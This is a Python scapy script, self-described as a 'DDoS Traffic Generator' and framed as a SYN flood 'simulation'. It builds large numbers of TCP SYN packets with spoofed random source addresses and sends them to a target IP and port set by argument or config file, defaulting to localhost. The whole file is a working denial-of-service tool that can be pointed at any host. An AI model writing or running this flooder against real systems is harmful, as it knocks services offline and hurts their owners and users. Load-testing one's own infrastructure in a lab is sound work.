import sys
import time
import argparse
import json
import os
from scapy.all import IP, TCP, sendp, Ether
from random import randint

# Default values
DEFAULT_TARGET_IP = "127.0.0.1"
DEFAULT_TARGET_PORT = 8080
DEFAULT_PACKETS = 1000

def load_config():
    config_path = os.path.join(os.path.dirname(__file__), 'config.json')
    if os.path.exists(config_path):
        with open(config_path, 'r') as f:
            return json.load(f)
    return {}

def generate_syn_flood(target_ip, target_port, packets_to_send):
    """Generates a high volume of TCP SYN packets using the reliable sendp function."""
    print("-" * 30)
    print(f"Starting SYN Flood Simulation")
    print(f"Target: {target_ip}:{target_port}")
    print(f"Total Packets to Inject: {packets_to_send}")
    print("-" * 30)

    packet_list = []
    
    print("Constructing packet list...")
    for _ in range(packets_to_send):
        ip_layer = IP(dst=target_ip, src=f"192.168.{randint(1, 254)}.{randint(1, 254)}")
        tcp_layer = TCP(dport=target_port, flags="S", sport=randint(1024, 65535))
        
        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ip_layer / tcp_layer
        packet_list.append(packet)

    try:
        print("Injecting packets...")
        start_time = time.time()

        sendp(packet_list, iface=None, verbose=0)
        end_time = time.time()
        
        duration = end_time - start_time
        actual_pps = packets_to_send / duration if duration > 0 else packets_to_send
        
        print(f"\nSimulation complete. Sent {packets_to_send} packets in {duration:.2f}s.")
        print(f"**Achieved Injection Rate: {actual_pps:.2f} PPS**")

    except Exception as e:
        print(f"\n[CRITICAL ERROR] sendp failed. Ensure generator runs as Administrator and Npcap is correct.")
        print(f"Underlying error: {e}")
        return

    print("Exiting generator.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='DDoS Traffic Generator')
    parser.add_argument('--target-ip', help='Target IP address')
    parser.add_argument('--port', type=int, help='Target port')
    parser.add_argument('--packets', type=int, help='Number of packets to send')
    
    args = parser.parse_args()
    
    config = load_config()
    
    target_ip = args.target_ip or config.get('target_ip', DEFAULT_TARGET_IP)
    target_port = args.port or config.get('target_port', DEFAULT_TARGET_PORT)
    packets = args.packets or config.get('packets_to_send', DEFAULT_PACKETS)
    
    try:
        generate_syn_flood(target_ip, target_port, packets)
    except Exception as e:
        print(f"\n[FATAL ERROR] Program exited unexpectedly. Details: {e}")
